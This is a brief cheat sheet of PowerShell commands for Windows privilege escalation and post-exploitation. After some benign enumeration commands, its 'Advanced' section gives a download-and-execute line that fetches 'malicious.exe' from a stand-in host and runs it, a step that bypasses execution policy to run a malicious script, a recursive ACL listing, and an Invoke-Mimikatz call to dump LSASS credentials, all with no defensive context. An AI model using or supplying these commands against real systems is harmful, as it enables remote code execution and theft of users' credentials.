Windows Privilege Escalation

PowerShell Commands


Get-Process -IncludeUserName
Get-WmiObject Win32_ComputerSystem
(Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount=True").Name
Get-Service -Name '*' | Where-Object { $_.Status -eq 'Stopped' }

Advanced PowerShell Techniques


# Download and execute a remote payload
Invoke-WebRequest -Uri 'http://example.com/malicious.exe' -OutFile 'C:\Temp\malicious.exe'
Start-Process 'C:\Temp\malicious.exe'

# Bypass Execution Policy and run a script
Set-ExecutionPolicy Bypass -Scope CurrentUser
. .\malicious.ps1

# List all ACLs for files and folders
Get-ChildItem -Recurse | Get-Acl

# Dump LSASS process memory for credential extraction
Invoke-Mimikatz -DumpCreds
